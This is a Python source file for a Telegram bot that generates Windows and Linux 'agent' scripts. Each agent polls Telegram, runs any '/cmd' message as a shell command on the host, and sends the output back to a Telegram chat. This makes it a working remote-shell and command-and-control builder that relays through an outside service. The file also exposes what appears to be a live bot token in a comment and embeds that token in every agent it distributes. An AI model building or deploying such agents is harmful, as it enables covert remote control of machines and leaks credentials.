import os
import sqlite3
import uuid
import subprocess
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Constants
with open("token.txt", "r") as file:
    BOT_TOKEN = file.read().strip()
#BOT_TOKEN = '8175135684:AAF74_3NpIEyjc2urQk4Of4rxWFHdU8PRNA'  # Replace with your bot token
DATABASE_PATH = 'database/agents.db'
AGENTS_DIR = 'agents'

# Ensure agents directory exists
os.makedirs(AGENTS_DIR, exist_ok=True)
os.makedirs(os.path.join(AGENTS_DIR, 'windows'), exist_ok=True)
os.makedirs(os.path.join(AGENTS_DIR, 'linux'), exist_ok=True)

# Database connection
def get_db_connection():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# Generate unique ID
def generate_unique_id():
    return str(uuid.uuid4())[:8]

# Generate agent script
def generate_agent_script(os_type, unique_id, chat_id, username):
    if os_type == 'windows':
        script = f'''
import os
import time
import requests
import subprocess

# Configuration (embedded during script generation)
BOT_TOKEN = "{BOT_TOKEN}"
UNIQUE_ID = "{unique_id}"
CHAT_ID = "{chat_id}"
USERNAME = "{username}"  # Add username here
OS_TYPE = "Windows"  # Add OS type here

# Initialize last processed update ID
last_update_id = 0

# Function to send output to Telegram
def send_output(output):
    url = f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendMessage"
    payload = {{
        "chat_id": CHAT_ID,
        "text": f"{{USERNAME}}-{{OS_TYPE}}:\\n{{output}}"
    }}
    try:
        print(f"Sending output to Telegram: {{output}}")
        response = requests.post(url, data=payload)
        print(f"Telegram API response: {{response.status_code}} - {{response.text}}")
    except Exception as e:
        print(f"Error sending output: {{e}}")

# Main loop
while True:
    # Fetch updates from the bot, starting from the last processed update ID
    updates = requests.get(f"https://api.telegram.org/bot{{BOT_TOKEN}}/getUpdates?offset={{last_update_id + 1}}").json()
    result = updates.get("result", [])

    # Process each update
    for update in result:
        update_id = update.get("update_id")
        message = update.get("message", {{}})
        command = message.get("text", "")

        # Check if the command is for this agent
        if command.startswith("/cmd"):
            # Extract the command to execute
            cmd_to_execute = command.split(" ", 1)[1]

            # Execute the command using subprocess
            print(f"Executing command: {{cmd_to_execute}}")
            try:
                output = subprocess.check_output(cmd_to_execute, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                output = e.output  # Capture error output if the command fails

            print(f"Command output: {{output}}")

            # Send the output back to Telegram
            send_output(output)

        # Update the last processed update ID
        last_update_id = update_id

    # Simulate a small delay (replace with actual command listening logic)
    time.sleep(1)
'''
        file_path = os.path.join(AGENTS_DIR, 'windows', f'{unique_id}.py')
    elif os_type == 'linux':
        script = f'''
#!/bin/bash

# Configuration (embedded during script generation)
BOT_TOKEN="{BOT_TOKEN}"
UNIQUE_ID="{unique_id}"
CHAT_ID="{chat_id}"
USERNAME="{username}"  # Add username here
OS_TYPE="Linux"  # Add OS type here

# Initialize last processed update ID
LAST_UPDATE_ID=0

# Function to send output to Telegram
send_output() {{
    OUTPUT="$1"
    echo "Sending output to Telegram: $OUTPUT"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="$USERNAME-$OS_TYPE:\n$OUTPUT"
}}

# Main loop
while true; do
    # Fetch updates from the bot, starting from the last processed update ID
    UPDATES=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$((LAST_UPDATE_ID + 1))")

    # Parse the updates
    UPDATE_COUNT=$(echo "$UPDATES" | jq '.result | length')
    if [[ $UPDATE_COUNT -gt 0 ]]; then
        # Process each update
        for ((i = 0; i < UPDATE_COUNT; i++)); do
            UPDATE=$(echo "$UPDATES" | jq -r ".result[$i]")
            UPDATE_ID=$(echo "$UPDATE" | jq -r '.update_id')
            COMMAND=$(echo "$UPDATE" | jq -r '.message.text')

            # Check if the command is for this agent
            if [[ $COMMAND == /cmd* ]]; then
                # Extract the command to execute
                CMD_TO_EXECUTE=$(echo "$COMMAND" | cut -d' ' -f2-)

                # Execute the command
                echo "Executing command: $CMD_TO_EXECUTE"
                OUTPUT=$($CMD_TO_EXECUTE 2>&1)
                echo "Command output: $OUTPUT"

                # Send the output back to Telegram
                send_output "$OUTPUT"
            fi

            # Update the last processed update ID
            LAST_UPDATE_ID=$UPDATE_ID
        done
    fi

    # Simulate a small delay (replace with actual command listening logic)
    sleep 1
done
'''
        file_path = os.path.join(AGENTS_DIR, 'linux', f'{unique_id}.sh')
    else:
        raise ValueError("Unsupported OS type")

    # Save the script to the file
    with open(file_path, 'w') as f:
        f.write(script.strip())  # Remove leading/trailing whitespace

    # Set executable permissions for Linux scripts
    if os_type == 'linux':
        os.chmod(file_path, 0o755)

    return file_path

# Command: /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username
    unique_id = generate_unique_id()

    # Save user data temporarily
    context.user_data['user_id'] = user_id
    context.user_data['username'] = username
    context.user_data['unique_id'] = unique_id
    context.user_data['chat_id'] = update.message.chat_id

    # Ask user to select OS
    keyboard = [
        [InlineKeyboardButton("Windows", callback_data='windows')],
        [InlineKeyboardButton("Linux", callback_data='linux')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Please select your OS:", reply_markup=reply_markup)

# Callback query handler for OS selection
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    os_type = query.data
    user_id = context.user_data['user_id']
    username = context.user_data['username']
    unique_id = context.user_data['unique_id']
    chat_id = context.user_data['chat_id']

    # Generate agent script
    script_path = generate_agent_script(os_type, unique_id, chat_id, username)

    # Save agent to database
    conn = get_db_connection()
    conn.execute('INSERT INTO agents (user_id, username, os, unique_id) VALUES (?, ?, ?, ?)',
                 (user_id, username, os_type, unique_id))
    conn.commit()
    conn.close()

    # Send agent to user
    with open(script_path, 'rb') as f:
        await query.message.reply_document(document=f, caption=f"Your {os_type} agent is ready! Use the script to activate the agent.")

# Command: /cmd
async def cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    command = update.message.text.split(' ', 1)[1]

    # Fetch agent unique_id from database
    conn = get_db_connection()
    agent = conn.execute('SELECT * FROM agents WHERE user_id = ?', (user_id,)).fetchone()
    conn.close()

    if not agent:
        await update.message.reply_text("No agent found for this user.")
        return

    # Send the command to the agent
    if agent['os'] == 'windows':
        subprocess.Popen(
            ['python', f'agents/windows/{agent["unique_id"]}.py'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    elif agent['os'] == 'linux':
        subprocess.Popen(
            ['bash', f'agents/linux/{agent["unique_id"]}.sh'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

    # Send confirmation to user
    #await update.message.reply_text(f"Command sent to agent {agent['unique_id']}.")

# Main function
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cmd", cmd))
    application.add_handler(CallbackQueryHandler(button))  # Register callback query handler

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()